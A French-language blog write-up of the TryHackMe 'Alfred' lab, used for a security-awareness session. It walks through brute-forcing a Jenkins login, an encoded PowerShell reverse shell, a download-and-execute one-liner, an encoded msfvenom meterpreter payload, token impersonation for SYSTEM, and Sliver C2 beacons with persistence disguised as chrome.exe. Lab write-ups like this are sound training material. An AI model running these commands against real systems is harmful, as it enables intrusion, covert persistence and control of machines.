 ---
title: "Alfred THM cybermois"
description: "Exploitation de Jenkins pour obtenir un shell initial, puis obtention de meilleurs privilèges en exploitant les jetons d'authentification Windows."
summary: "Exploitation de Jenkins pour obtenir un shell initial, puis obtention de meilleurs privilèges en exploitant les jetons d'authentification Windows."
categories: ["C2C", "Exploitation"]
tags: ["Outil", "Beta", "Test"]
date: 2025-03-25
draft: false
authors:
  - ayzzeur
---

{{< lead >}}


Au travers deAu travers de la plateforme `Tryhackme` je vais vous faire part de ma résolution de la boxe **Alfred**. J'ai effectué la résolution de celle-ci devant plusieurs collaborateurs, dans le but de les sensibiliser aux problématiques de cybersécurité lors du cyber mois.
{{< /lead >}}

#Informations
Jenkins est un outil d'automatisation open source, principalement utilisé pour l'intégration continue et la livraison continue (CI/CD). 

Port par défaut :
Jenkins utilise par défaut le port *8080* pour les communications HTTP. Vous pouvez accéder à l'interface utilisateur de Jenkins en ouvrant un navigateur et en visitant 

*http://<adresse_ip_de_votre_serveur>:8080*

Jenkins est un outil puissant qui peut être configuré de nombreuses façons pour répondre aux besoins spécifiques de processus de développement logiciel.

# Partie reconnaissance
Début de la phase de reconnaissance par l’outil nmap, explication nmap + arguments.
```shell
nmap -v -A -F -T4 -Pn 10.10.146.136

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=alfred
| Issuer: commonName=alfred
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-03T07:59:17
| Not valid after:  2025-03-05T07:59:17
| MD5:   1255 1c3f 91c2 0fb9 1e02 131f 66d2 1a0e
|_SHA-1: d7de 9551 4d97 7efd 1400 519c a964 a65b 8401 3c48
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8)
```

A noter, on est sur une machine windows

Un petit tour sur l’ip





# Acces initial
On atterri sur Jenkins qui est un outil d'automatisation open source, principalement utilisé pour l'intégration continue et la livraison continue (CI/CD).

ip:8080/



Burp Proxy à régler dans le navigateur
Intercepte les requêtes web
Clique droit send to intruder
Mettre une variable mdp

Faire load le fichier à utiliser pour le brute force

Dans ce dossier faire de open top-20-common-SSH-passwords.txt

Comment savoir lequel est le bon ?
La longueur ! (Les messages de succes sont souvents plus court dans la reponse))

& on voit une session ouverte comparé aux autres


Utilisation de la CI/CD

Créer un new item en freestyle->build->execute a windows commande bash

Le site https://www.revshells.com/ permettra d’avoir la commande générer ci dessous.

Utilisation de la commande avec encodage -64 L'encodage Base64 est une méthode de conversion de données binaires en une chaîne de caractères ASCII. Il est souvent utilisé pour transmettre des données sur des médias qui ne sont conçus pour gérer que du texte, comme les courriels ou les URL (permet d’éviter une quelconque erreur d’interprétation de la commande; guillemets etc)

```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADMANwAuADYAMQAiACwAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

& sur la la machine d'attaque
```shell
sudo nc -lvnp 80
```

Ou sinon
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```


Recherche du flag user.txt
```powershell
Get-ChildItem -Path C:\ -Recurse | Where-Object {$_.Name -like "*user.txt*"}
```
Lecture du fichier
```powershell
cat C:\Users\bruce\Desktop\user.txt
```

# Changement de shell
Sur la machine d’attaque, création de la payload est utilisé dans divers contextes techniques pour désigner les données effectives transmises dans une communication, en excluant les en-têtes, métadonnées, ou autres informations de contrôle. Nous permettant de récupérer la console meterpreter.Parler de l'obfuscation port 80/443 par rapport à un autre.

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.37.61 LPORT=443 -f exe -o filouterie.exe
```

Lancement du serveur python qui permettra de récupérer le binaire.
```shell
python3 -m http.server
```

Récupérer la payload sur la machine  jenkins.
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.37.61:8000/filouterie.exe','filouterie.exe')"
```

De nouveau sur la machine d’attaque, dans Metasploit configuration de la payload et run.
```shell
msfupdate
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.8.37.61
set LPORT 443
run
```

Sur Jenkins, exécution de la payload.
```Powershell
Start-Process "filouterie.exe"
```
Ou via jenkins si marche pas, il faut mettre projet/xx.exe
```powershell
start filouterie.exe
```



#Elevation de privilieges

```shell
whoami /priv
```

Vous pouvez voir deux privilèges **SeDebugPrivilege, SeImpersonatePrivilege **sont activés. 

EXPLICATION DES PRIVILEGES windows

`SeImpersonatePrivilege`<-Celui qui nous intéresse

Est le droit d’utilisateur *« Emprunter l’identité d’un client après l’authentification »* (SeImpersonatePrivilege).

Par défaut, les membres du groupe Administrateurs locaux de l’appareil et du compte de service local de l’appareil reçoivent le droit d’utilisateur *« Emprunter l’identité d’un client après l’authentification »*.

EXPLICATION DE INCOGNITO ET VARIANTS COMME ROTEN POTATO
Pour l’élévation des privilèges sur windows, il y a une suite d’outils patates:
*Hot potatoes, Rotten potatoes, Lonely potatoes, Juicy potatoes, Rogue potatoes, Sweet potatoes & Generic potatoes*. 

Le but est de passer du compte Windows Service Accounts à **NT AUTHORITY/SYSTEM**.

En gros, le module Incognito est un dérivé de la série des potatoes et permet de voler des jetons de la même manière que le vol de cookies web, en rejouant cette clé temporaire lorsqu'on lui demande de s'authentifier.

Pour faire en automatique tout ça
```shell
get system
```

POUR LA DEMO

Dans la console meterpreter
```shell
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid
```


*Ne marche plus depuis Windows 10 1809 & Windows Server 2019*


Même si on a avez un jeton de privilège supérieur, on ne disposerait peut-être pas des droits d'un utilisateur privilégié (ceci est dû à la façon dont Windows gère les autorisations - elle utilise le jeton primaire du processus et non le jeton usurpé pour déterminer ce que le processus peut ou ne peut pas faire). Il faut migrer vers un processus avec des autorisations répondant à notre besoin. Le processus correspondant est le processus services.exe. Tout d'abord, la commande ps pour afficher les processus et trouver le PID du processus services.exe 
Migrer vers ce processus en utilisant la commande: 
```shell
ps
migrate pid
```

Faire un tour de meterpreter

Passage en shell windows
`shell`

Avec le cli windows
```powershell
C:\Windows\system32>cd config
C:\Windows\System32\config>more root.txt
dff0f748678f280250f25a45b8046b4a
```
User

# 🦧Sliver
Server de commande and control explication

Un serveur de commande et de contrôle (C&C) est un composant essentiel dans l'infrastructure des cyberattaques, notamment celles impliquant des botnets, des chevaux de Troie, des ransomwares et d'autres types de logiciels malveillants. On va pouvoir stocker les informations de machines compromises pour lancer en masses des commandes par exemple, ou venir à plusieurs attaquants sur le serveur pour effectuer plusieurs manipulations en même temps.

https://github.com/BishopFox/sliver

Si sliver est déjà installé, il faut démarrer le service
systemctl start sliver


Installation + paramétrage de sliver
```shell
mkdir sliver
cd sliver
curl https://sliver.sh/install|sudo bash
sliver
```

Session comme du meterpreter en interactif
Beacons, systeme taff tt les x seconde heures ou jour
Analyse des ioc et si c’est repere ca kill pour ne pas se faire repérer
```shell
mtls -L 10.8.37.61 -l 9000

[*] Starting mTLS listener ...

[*] Successfully started job #1
```

Création de la payload
```shell
generate beacon --mtls 10.8.37.61:9000 --save alfred.exe
```

Mise en pause de la session meterpreter
Dans msfconsole
Ctrl+z
```shell
use post/windows/manage/persistence_exe
set rexename chrome.exe
set startup SYSTEM
set session X
set rexepath /root/sliver/alfred.exe
run
```

Dans sliver Beacons, système taff tt les x seconde heures ou jour
```shell
beacons
use id
ls
tasks
```



Beacon a session interactive il crée automatiquement une session interactive en plus du beacon
```shell
Interactive
Use id
```

Shell pour Linux

#shell windows
```shell
shell --no-pty --shell-path c:\\windows\\system32\\cmd.exe

exit

getsystem
```

Bleu c’est beacon rouge c’est interactif

